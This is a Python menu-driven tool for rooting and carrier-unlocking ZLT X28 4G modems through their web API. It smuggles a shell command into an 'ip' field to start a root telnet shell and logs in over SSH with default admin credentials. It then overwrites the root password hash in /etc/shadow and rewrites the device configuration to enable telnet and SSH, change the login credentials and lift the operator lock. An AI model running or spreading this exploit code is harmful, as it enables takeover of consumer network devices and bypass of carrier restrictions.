import requests
import json
import urllib3
import paramiko
import time
import os

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

urllib3.disable_warnings()
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"
LIGHT_BLUE = "\033[1;34m"
# ========= INPUT =========
clear_screen()
print("\n=========================== TIHSG-IT ===========================")
ip = input(f"Enter modem IP: {LIGHT_BLUE}").strip()
session_id = input(f"{RESET}Enter session ID: {LIGHT_BLUE}").strip()
print(RESET)

url = f"https://{ip}/cgi-bin/http.cgi"
headers = {"Content-Type": "application/json"}

ssh_status=None
telnet_status=None
data_info=None
data_port=None
# ========= SSH USERS =========
admin_user = "admin"
admin_pass = "admin"
root_user = "root"
root_pass = "admin"
superusername="super"
superuserpass="super"
theme_name="du"
theme="home.css"
image="logo_AE0001.png"
validsessionid="Enable"
config_path = "/mnt/data/etc/tzcfg/main_config"

def color_status(s: str):
    return f"{RED}{s}{RESET}" if s in ("Expired", "Disable","super","None") else f"{GREEN}{s}{RESET}"


# ========= MODEM INFO =========
def get_modem_info():
    global data_info
    payload = {
        "cmd": 393,
        "method": "POST",
        "sessionId": session_id
    }

    r = requests.post(url, json=payload, headers=headers, verify=False, timeout=5)
    data_info = r.json()

def open_shell():
    payload = {
        "enabled": "1",
        "ip": "192.168.1.1 ; telnetd -l /bin/ash",
        "cmd": 172,
        "method": "POST",
        "subcmd": 6,
        "sessionId": session_id
    }

    r = requests.post(url, json=payload, headers=headers, verify=False, timeout=5)
    print("Shell access response:")
    print(r.text)

# ========= OPEN PORTS =========
def get_open_ports():
    global data_port
    payload = {
        "cmd": 400,
        "method": "POST",
        "subcmd": 6,
        "sessionId": session_id
    }

    r = requests.post(url, json=payload, headers=headers, verify=False, timeout=5)
    data_port = r.json()
    global validsessionid
    validsessionid = "Expired" if "NO_AUTH" == data_port.get("message") else session_id
# ========= resetfactory =========

def reset_factory():

    try:
        payload = {
            "cmd": 112,
            "method": "POST",
            "subcmd": 6,
            "sessionId": session_id
        }
        requests.post(url, json=payload, headers=headers, verify=False, timeout=30)

        print("\n===== Reset Factory Done =====")

    except:
        print("resetfactory faild")

# ========= reboot =========

def reboot():

    payload = {
        "cmd": 6,
        "method": "POST",
        "subcmd": 6,
        "sessionId": session_id
    }

    requests.post(url, json=payload, headers=headers, verify=False, timeout=5)


# ========= ENABLE WAN =========
def enable_wan():
    print("\n[+] Enabling WAN Link Detect...")

    payload_detect = {
        "wanLinkDetectSwitch": 1,
        "wanLinkDetectCheckTime": "5",
        "checkWanLinkDetectMode": 0,
        "wanLinkDetectIP1": "8.8.8.8",
        "wanLinkDetectIP2": "114.114.114.114",
        "wanLinkDetectIP3": "baidu.com",
        "LinkDetectAction": "0",
        "reboot_wait_time": "10",
        "dnsv4_server_sw": "1",
        "dnsv4_server1": "223.5.5.5",
        "dnsv4_server2": "119.29.29.29",
        "dnsv4_server3": "180.76.76.76",
        "dnsv6_server_sw": "1",
        "dnsv6_server1": "2001:dc7:1000::1",
        "dnsv6_server2": "2400:3200::1",
        "dnsv6_server3": "2001:4860:4860::8888",
        "method": "POST",
        "cmd": 336,
        "token": "4f2d35b4fff660f7875d29c4b6936363",
        "language": "EN",
        "sessionId": session_id
    }

    r1 = requests.post(url, json=payload_detect, headers=headers, verify=False, timeout=5)
    print("Link Detect:", r1.status_code)

    time.sleep(1)

    print("[+] Enabling WAN...")

    payload_wan = {
        "networkMode": "5",
        "method": "POST",
        "cmd": 277,
        "wifiMode2": "0",
        "wifiMode5": "0",
        "wanRouter": "0",
        "wifi2Router": "0",
        "wifi5Router": "0",
        "apnRouter0": "1",
        "apnRouter1": "0",
        "apnRouter2": "0",
        "apnRouter3": "0",
        "wanRouter1": "0",
        "wanRouter2": "0",
        "wanRouter3": "0",
        "priorityStrategy": "0",
        "token": "542edf69c2a4dc1189a09cc989c65d3d",
        "language": "EN",
        "sessionId": session_id
    }

    r2 = requests.post(url, json=payload_wan, headers=headers, verify=False, timeout=5)
    print("WAN status:", r2.status_code)
    print("WAN activated")

def ssh_exec(user, pwd, command):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(
        ip,
        username=user,
        password=pwd,
        look_for_keys=False,
        allow_agent=False,
        timeout=5
    )
    stdin, stdout, stderr = c.exec_command(command)
    stdout.channel.recv_exit_status()
    c.close()

# ========= UNLOCK =========
def unlock_modem():
    
    config_data = """export SYS_AERA_ID=""
export SYS_HW_MODEL="ZLT X28"
export SYS_CFG_VER="X28"
export SYS_USER_WEB_THEME=\""""+theme+""""
export SYS_LANGUAGE="EN"
export SYS_LANGUAGE_SHOW="1"
export SYS_WEB_BROWSER_TITLE=""
export USER_WEB_LOGO_PATH=\""""+image+""""
export SYS_SIM_SLOT_CONFIG="0"
export SYS_SMS_SW="1"
export SYS_SMS_SMSC_EDIT_SW="0"
export SYS_SMS_CONTACK_MAX_LEN="640"
export SYS_SMS_MAX_SAVE_SIZE="1000"
export USR_FLOW_LIMIT_SW="0"
export SYS_LOCK_OPERATOR_SW="0"
export SYS_LOCK_OPERATOR_LIST=""
export USR_PCI_LOCK_ENABLE="0"
export USR_PCI_NUM_MAX="32"
export SYS_SN_FIXED_SW="0"
export SYS_SN_HEAD="X28"
export SYS_REBOOT_WHEN_MODEM_UNORMAL="1"
export SYS_WEB_PROTOCOL_TYPE="2"
export SYS_TELNET_SWITCH="1"
export SYS_SSH_SWITCH="1"
export USR_MODEM_LOG_SW="0"
export SYS_USER_LOGIN_NAME=\""""+superusername+""""
export SYS_USER_LOGIN_PWD=\""""+superuserpass+""""
export SYS_WEB_USER_PWD_RULE="1"
export SYS_WEB_USER_PWD_HEAD=""
export SYS_SENIOR_LOGIN_NAME="Admin"
export SYS_SENIOR_LOGIN_PWD="Admin"
export SYS_WEB_SENIOR_PWD_RULE="1"
export SYS_WEB_SENIOR_PWD_HEAD=""
export SYS_SUPER_LOGIN_NAME="root"
export SYS_SUPER_LOGIN_PWD="root"
export SYS_WEB_SUPER_PWD_RULE="1"
export USR_NW_MODE_SEL="1C"
export USR_NW_AUTO_DIAL="1"
export USR_NW_AIRPLANE_MODE_ENABLE="0"
export USR_NW_AUTO_QUERY_INTERVAL="10"
export USR_DATA_ROAMING_SW="0"
export USR_LTE_BAND_LOCK_SW="0"
export USR_DNS_LOCAL_DOMAIN="m.home"
export SYS_4GWAN_NETWORKMODE="mobile"
export USR_WAN_MODE="1"
export USR_WAN_COMMUNICATION_PRIORITY_STRATEGY="0"
export USR_WAN_IPVERSION="IPV4"
export USR_WAN_LINKMODE="linkIP"
export USR_WAN_MTU="1500"
export USR_WAN_IPMODE="dhcp"
export USR_WAN_NAT_SW="1"
export USR_WAN_LINK_DETECT_SW="0"
export USR_WAN_LINK_DETECT_IPADDR1="8.8.8.8"
export USR_WAN_LINK_DETECT_IPADDR2="114.114.114.114"
export USR_WAN_LINK_DETECT_IPADDR3="baidu.com"
export USR_WAN_LINK_DETECT_INTERVAL="5"
export USR_LINK_DETECT_RESPONSE_ACTION="0"
export USR_DATA_CONN_CHK_REBOOT_WAIT_TIME="10"
export USR_NTP_TIMEZONE="UTC-4"
export USR_NTP_SERVER="asia.pool.ntp.org"
export USR_NTP_SERVER_1="time.nist.gov"
export USR_APN_NAME=""
export USR_APN_PDP_TYPE="IPV4V6"
export USR_APN_AUTH_MODE="0"
export USR_APN_USERNAME=""
export USR_APN_PWD=""
export USR_APN_MTU="1500"
export USR_APN_NAT="1"
export USR_DHCP_LAN_IP="192.168.70.1"
export USR_DHCP_SUBNET_MASK="255.255.255.0"
export USR_DHCP_SERVER_SW="1"
export USR_DHCP_PRIMARY_DNS="192.168.70.1"
export USR_DHCP_SECONDARY_DNS=""
export USR_DHCP_START_IP="192.168.70.3"
export USR_DHCP_END_IP="192.168.70.253"
export USR_DHCP_LEASE_TIME="24h"
export USR_DHCP_MTU="1500"
export USR_DHCP_MSS="0"
export USR_TR069_SW="0"
export SYS_VOLTE_SW="0"
export USR_VOLTE_IMS="ims"
export USR_TEL_DM_CSCA=""
export USR_FWT_SW="1"
export USR_FWT_UPNP_SW="0"
export USR_IDU_REG_DOMAIN="CH"
export SYS_SSID_RULE="2"
export SYS_SSID_FIXED=""
export SYS_SSID_HEAD="X28-2.4G-"
export SYS_SSID_WLAN5G_HEAD="X28-5G-"
export SYS_SSID_TAIL=""
export SYS_MULTI_SSID_SW="0"
export SYS_MULTI_SSID_NUM="0"
export SYS_WIFI_PWD_RULE="3"
export USR_WLAN2G_TX_POWER="100"
export USR_WLAN2G_CHANNEL="auto"
export USR_WLAN2G_MODE="16"
export USR_WLAN2G_BANDWIDTH="2"
export USR_WLAN2G_MAX_STATION="64"
export USR_WLAN2G_SGI_SWITCH="1"
export USR_WLAN2G_WPS_SWITCH="1"
export USR_WLAN5G_TX_POWER="100"
export USR_WLAN5G_CHANNEL="auto"
export USR_WLAN5G_MODE="17"
export USR_WLAN5G_BANDWIDTH="3"
export USR_WLAN5G_MAX_STATION="64"
export USR_WLAN5G_SGI_SWITCH="1"
export USR_WLAN5G_WPS_SWITCH="1"
export USR_WLAN2G_SWITCH_0="1"
export USR_WLAN2G_BROADCAST_0="1"
export USR_WLAN2G_WMM_SWITCH="1"
export USR_WLAN2G_ENCRYPTTION_0="5"
export USR_WLAN2G_CIPHER_SUITE_0="1"
export USR_WLAN5G_SWITCH_0="1"
export USR_WLAN5G_BROADCAST_0="1"
export USR_WLAN5G_WMM_SWITCH="1"
export USR_WLAN5G_ENCRYPTTION_0="5"
export USR_WLAN5G_CIPHER_SUITE_0="1"
export USR_WEB_PAGE_HIDE="30000000000000000000000000000001400000000400c00000000000000101000000000100c030403005555f5555000040104050004000001500000ff"
export SYS_LANGUAGE_SUPPORT="3"
"""
    print("Setting root password...")

    ssh_exec(
        admin_user,
        admin_pass,
        "sed -i 's|^root:[^:]*:|root:$1$/nX.yvU1$Uvx8/Qr45i8bPpkY.8XgA1:|' /etc/shadow ; rm -f /mnt/data/etc/tzcfg/update_config"
    )

    time.sleep(1)

    print("Writing config...")
    write_cmd = f"cat > {config_path} << 'EOF'\n{config_data}\nEOF"
    ssh_exec(root_user, root_pass, write_cmd)

    # print("Rebooting...")
    # ssh_exec(root_user, root_pass, "sleep 4 ; reboot")

    print("Unlock done.")

# ========== ssh shell =========
def ssh_shell_access():
    import paramiko
    import subprocess
    import time
    rooter = "root@"+ip
    # مرحله ۱: admin → ست پسورد root
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=ip,
        username="admin",
        password="admin",
        look_for_keys=False,
        allow_agent=False
    )

    cmd = "sed -i 's|^root:[^:]*:|root:$1$/nX.yvU1$Uvx8/Qr45i8bPpkY.8XgA1:|' /etc/shadow"
    client.exec_command(cmd)
    client.close()

    time.sleep(1)

    # مرحله ۲: شل واقعی root با ssh ویندوز
    subprocess.run([
        "ssh",
        "-o", "HostKeyAlgorithms=+ssh-rsa",
        rooter
    ])
# ========== telnet shell =========
def telnet_shell_access():
    pass
# ========= START =========
shell = ""
def status():
    global ssh_status 
    global telnet_status 
    global shell
    get_modem_info()
    get_open_ports()
    
    if not data_info:
        print("Failed to get modem info")
        return

    print("\n===== MODEM INFORMATION =====")
    print("Board Type      :", data_info.get("board_type"))
    print("HW Version      :", data_info.get("hwversion"))
    print("Firmware        :", data_info.get("real_fwversion"))
    print("IMEI            :", data_info.get("module_imei"))
    print("IMSI            :", data_info.get("IMSI"))

    print("\n===== NETWORK =====")
    print("Operator        :", color_status(str(data_info.get("network_operator"))))
    print("Network Type    :", color_status(str(data_info.get("network_type_str"))))
    print("Network Address :",GREEN+ip+RESET)

    if data_port:
        print("\n===== OPEN PORTS =====")
        print("Open ports:", color_status(str(data_port.get("systemPort"))))
        ssh_status = "Enable" if "22" in data_port.get("systemPort", "") else "Disable"
        telnet_status = "Enable" if "23" in data_port.get("systemPort", "") else "Disable"
        shell = "Enable" if ("Enable" in (ssh_status, telnet_status)) else "Disable"
try:
    while True:
        # clear_screen()
        print("\n=========================== TIHSG-IT =============  Dev_By >> Mr-Tezar  ==============")
        status()
        print("\n========= MENU =========")
        print("1) Enable WAN")
        print(f"2) Set Session id : {color_status(validsessionid)}")
        print(f"3) Enable Shell Access : {color_status(shell)}")
        print("4) Set Web Theme : " + LIGHT_BLUE + theme_name + RESET)
        print("5) Set SuperAdmin UserName : Password : " +LIGHT_BLUE+superusername + RESET + " : " + LIGHT_BLUE + superuserpass + RESET)
        print("6) Apply Configs and Unlock operator")
        print("7) Reset Factory And Reboot")
        print(f"8) SSH Shell Access -> root:admin : {color_status(ssh_status)}")
        print(f"9) Telnet Shell Access : {color_status(telnet_status)}")
        print("10) Refresh")
        print("0) Exit")

        choice = input("Select option: ").strip()

        if choice == "1":
            enable_wan()
        elif choice == "2":
            session_id=input("Enter session ID: ").strip()
            get_modem_info()
        elif choice == "3":
            open_shell()
        elif choice == "4":
            print("\n========= Themes =========")
            print("1) du")
            print("2) irancell")
            print("3) HamrahAval")
            print("4) ooredoo")
            print("5) airtel")
            choiceTheme=input("Select Theme: ").strip()
            if choiceTheme=="1":
                pass
            elif choiceTheme=="2":
                theme="main.mtn.css"
                image="mtn_logo.png"
                theme_name="irancell"
            elif choiceTheme=="3":
                image="logo_ZD0001_mci.png"
                theme_name="HamrahAval"
            elif choiceTheme=="4":
                theme="main.ooredoo.css"
                image="logo_OMN247.png"
                theme_name="ooredoo"
            elif choiceTheme=="5":
                theme="airtel.css"
                image="logo_airtel.png"
                theme_name="airtel"
            elif choiceTheme=="6":
                theme="mobot.css"
                theme_name="mobot"
        elif choice == "5":
            superusername=input("Enter UserName: ")
            superuserpass=input("Enter Password: ")
        elif choice == "6":
            try:
                unlock_modem()
            except:
                print("unplug power cable and connect agane and try agane")
        elif choice == "7":
            reset_factory()
            reboot()
        elif choice == "8":
            try:
                ssh_shell_access()
            except:
                print("ssh is close if open shell access unplug power cable and connect agane")
        elif choice == "9":
            try:
                telnet_shell_access()
            except:
                print("telnet is close if open shell access unplug power cable and connect agane")
        elif choice == "0":
            print("End .....")
            break
        else:
            print("Invalid option")
except:
    print("Network faild .......")
